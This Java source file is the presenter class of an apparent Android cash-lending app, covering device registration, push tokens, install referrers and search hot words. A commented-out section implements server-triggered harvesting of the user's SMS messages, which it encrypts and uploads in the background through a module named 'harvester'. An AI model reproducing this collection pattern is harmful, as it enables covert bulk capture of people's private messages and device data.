package com.id.cash.presenter;

import android.Manifest;
import android.app.Activity;
import android.text.TextUtils;

import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.ArrayList;
import java.util.HashMap;

import io.reactivex.schedulers.Schedulers;
import com.id.cash.MainApplication;
import com.id.cash.bean.ApiReturn;
import com.id.cash.bean.BatchBean;
import com.id.cash.bean.RegisterDeviceResultBean;
import com.id.cash.bean.SMSBean;
import com.id.cash.common.DeviceUtil;
import com.id.cash.common.InstallReferrelHelper;
import com.id.cash.common.JsonUtil;
import com.id.cash.common.LogUtil;
import com.id.cash.common.Preference;
import com.id.cash.common.PrivacyPolicyUtil;
import com.id.cash.common.SecurityUtil;
import com.id.cash.module.starwin.common.base.IView;
import com.id.cash.module.starwin.common.rx.RetryWithDelay;
import com.id.cash.module.starwin.harvester.SMSManager;
import com.id.cash.network.ApiActions;
import com.id.cash.network.RestApiSubscriber;

/**
 * Created by linchen on 2018/5/23.
 */

public class AppPresenter extends BasePresenter<IView> {
//    private static boolean isPostingSms = false;
    private InstallReferrelHelper installReferrelHelper;

    public AppPresenter(IView view) {
        super(view);
    }

    private static String encrypt(ArrayList<SMSBean> arrayList) {
        String json = JsonUtil.stringify(arrayList);
        return SecurityUtil.aesEncrypt(json);
    }

    public void registerPushToken(String token) {
        register(api.registerPushToken(token),
                // currently we are not retrying, so the subs does nothing
                new RestApiSubscriber() {
                    @Override
                    public void onFinish(String code, String message) {
                    }

                    @Override
                    public void onData(String code, String message, ApiReturn data) {
                    }

                    @Override
                    public void onError(String code, String message) {
                    }
                }
        );
    }

    public void registerDevice(String action) {
        HashMap<String, Object> deviceIds = DeviceUtil.getDevice();
        HashMap<String, Object> deviceProps = DeviceUtil.getDeviceProperties();

        HashMap<String, Object> body = new HashMap<String, Object>() {
            {
                put("device", deviceIds);
                put("deviceProperty", deviceProps);
            }
        };

        register(api.registerDevice(body),
                new RestApiSubscriber<RegisterDeviceResultBean>() {
                    @Override
                    public void onFinish(String code, String message) {
                    }

                    @Override
                    public void onData(String code, String message, ApiReturn<RegisterDeviceResultBean> data) {
                        if (view != null) {
                            // when server returns the UDID
                            // the data is saved to Preference by the SWInterceptor
                            // so we don't need to do anything here
                        }
                    }

                    @Override
                    public void onError(String code, String message) {
                    }
                });
    }

    // hotwords loaded in MainActivity to save network bandwidth
    public void loadHotWords(String action) {
        register(api.getHotWords(),
                new RestApiSubscriber() {
                    @Override
                    public void onFinish(String code, String message) {
                    }

                    @Override
                    public void onData(String code, String message, ApiReturn data) {
                        if (data != null && data.getData() != null) {
                            if (view != null) {
                                String str = (String) data.getData();
                                ArrayList<String> hotWords = new ArrayList<>();
                                if (!TextUtils.isEmpty(str)) {
                                    String[] split = str.split(",");
                                    for (String w : split) {
                                        hotWords.add(w.trim());
                                    }
                                }
                                view.onApiResult(action, hotWords);
                            }
                        }
                    }

                    @Override
                    public void onError(String code, String message) {
                        if (view != null) {
                            view.getLoading().showError(action, code, message);
                        }
                    }
                }
        );
    }

    public void checkReferrer() {
        // when first launch flag is set (and get install referrer only once)
        if (!Preference.getInstance().getIsFirstLaunchCalled()) {
            if (installReferrelHelper == null) {
                subscribeInstallReferrerListener();
            }
            // referrer is received in subscribeInstallReferrerListener
            installReferrelHelper.getReferrerAsync(MainApplication.getContext());
        }
    }

    private void subscribeInstallReferrerListener() {
        installReferrelHelper = new InstallReferrelHelper();
        installReferrelHelper.setOnInstallReferrerListener((referrer) -> {
            if (!TextUtils.isEmpty(referrer)) {
                postInstallReferrer(ApiActions.INSTALL_REFERRER, referrer);
            } else {
                Preference.getInstance().setFirstLaunchCalled();
            }
        });
    }

    private void postInstallReferrer(String action, String referrer) {
        register(api.postInstallReferrer(referrer), new RestApiSubscriber<String>() {
            @Override
            public void onFinish(String code, String message) {
            }

            @Override
            public void onData(String code, String message, ApiReturn<String> data) {
                // on success return, remove the referrer from preference
                Preference.getInstance().setFirstLaunchCalled();
            }

            @Override
            public void onError(String code, String message) {
            }
        });
    }

//    public void requestAndCollectUserData(String action, Activity activity) {
//        if (!PrivacyPolicyUtil.shouldCollectPrivacyData()) {
//            return;
//        }
//
//        // 1. get batch
//        // 2. check batch status
//        // 3. send sms if batch requires
//        // 4. update batch status
//        register(api.getBatch(), new RestApiSubscriber<BatchBean[]>() {
//            @Override
//            public void onFinish(String code, String message) {
//            }
//
//            @Override
//            public void onData(String code, String message, ApiReturn<BatchBean[]> data) {
//                if (data != null && data.getData() != null && data.getData().length > 0) {
//                    // when there are user data (SMS/contacts) to collect
////                    collectUserData(data.getData(), activity);
//                }
//            }
//
//            @Override
//            public void onError(String code, String message) {
//                // do not show error for background operation
//            }
//        });
//    }

//    private void collectUserData(BatchBean[] batchBeans, Activity activity) {
//        if (!isPostingSms) {
//            isPostingSms = true;
//
//            // 1. find the server requested info (SMS)
//            BatchBean smsBatchBean = null;
//            if (batchBeans != null) {
//                for (BatchBean bean : batchBeans) {
//                    if (BatchBean.InfoBatchBeanType.SMS.equals(bean.getInfoType()) &&
//                            !BatchBean.InfoBatchStatus.COMPLETED.equals(bean.getInfoStatus())) {
//                        smsBatchBean = bean;
//                    }
//                }
//            }
//
//            if (smsBatchBean != null) {
//                final BatchBean batchBean = smsBatchBean;
//                // 2. request permission
//                RxPermissions rxPermissions = new RxPermissions(activity);
//                rxPermissions.request(Manifest.permission.READ_SMS)
//                        .subscribe(granted -> {
//                            if (granted) {
//                                collectSMS(batchBean);
//                            }
//                        });
//            } else {
//                isPostingSms = false;
//            }
//        }
//    }

//    private void collectSMS(BatchBean batchBean) {
//        SMSManager.smsBatches()
//                .observeOn(Schedulers.io())
//                .subscribeOn(Schedulers.io())
//                .map(AppPresenter::encrypt)
//                .flatMap((encrypted) -> {
//                    return api.postSmsBatch(batchBean.getId(), encrypted)
//                            .retryWhen(new RetryWithDelay(2, 2000));
//                })
//                .doOnComplete(() -> {
//                    // notify server
//                    completeBatch(batchBean);
//                })
//                .subscribe((uploadResult) -> {
//                    LogUtil.d(uploadResult.toString());
//                }, (error) -> {
//                    LogUtil.e(error);
//                    // abort this run
//                    isPostingSms = false;
//                }, () -> {
//                    isPostingSms = false;
//                });
//    }

    // notify server the batch is completed
//    private void completeBatch(BatchBean batchBean) {
//        HashMap<String, Object> hashMap = new HashMap<String, Object>() {
//            {
//                put("infoStatus", BatchBean.InfoBatchStatus.COMPLETED);
//                put("batchId", batchBean.getBatchId());
//                put("id", batchBean.getId());
//            }
//        };
//        register(api.updateInfoBatchStatus(hashMap), new RestApiSubscriber<Boolean>() {
//            @Override
//            public void onFinish(String code, String message) {
//            }
//
//            @Override
//            public void onData(String code, String message, ApiReturn<Boolean> data) {
//            }
//
//            @Override
//            public void onError(String code, String message) {
//                // background operation, so no UI notification
//            }
//        });
//    }
}
